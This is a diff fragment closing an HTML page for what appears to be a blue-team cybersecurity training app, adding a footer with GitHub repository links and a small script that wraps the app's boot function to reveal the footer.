+      <div class="app-footer-sep"></div>
+      <!-- Repo links -->
+      <a class="app-footer-link suite-link" href="https://github.com/Selimjerbi66/CyberAtaraxia-Training-Suite" target="_blank" rel="noopener" title="CyberAtaraxia Training Suite repository">
+        <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+        Training Suite
+      </a>
+      <a class="app-footer-link suite-link" href="https://github.com/Selimjerbi66/CyberAtaraxia-Suite" target="_blank" rel="noopener" title="CyberAtaraxia Suite — tools for ICT Engineers">
+        <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+        CyberAtaraxia Suite
+      </a>
+      <div class="app-footer-sep"></div>
+      <span style="font-family:var(--mo);font-size:10px;color:var(--tx3)">© 2025 Selim JERBI</span>
+    </div>
+  </footer>
+
+  <!-- Show app footer once app is active -->
+  <script>
+  const _origBootApp = typeof bootApp === 'function' ? bootApp : null;
+  </script>
+
+  <script src="js/CyberAtaraxia_BlueTeam.js"></script>
+
+  <!-- Patch bootApp to also show footer and logo -->
+  <script>
+  const _origBoot = bootApp;
+  bootApp = function() {
+    _origBoot();
+    // Show app footer
+    const f = document.getElementById('app-footer');
+    if (f) f.style.display = 'flex';
+    // Try logo in header
+    const hlogo = document.getElementById('hdr-logo');
+    if (hlogo) {
+      hlogo.onerror = function() { this.style.display='none'; };
+    }
+  };
+  </script>
+
+</body>
+</html>
